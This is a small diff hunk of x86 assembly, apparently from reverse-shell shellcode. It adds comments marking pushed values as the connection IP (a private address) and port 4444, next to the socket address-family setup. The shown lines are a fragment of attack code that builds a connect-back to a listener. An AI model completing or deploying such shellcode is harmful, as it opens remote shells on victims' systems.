@@ -137,8 +137,8 @@ XCHG ECX, EBP
 CALL EDX
 
 
-PUSH 0x4401a8c0
-PUSH word 0x5c11
+PUSH 0x4401a8c0 ; IP for connection 
+PUSH word 0x5c11 ; PORT for connection
 XOR  EBX, EBX
 add  BL, 0x2
 PUSH word BX
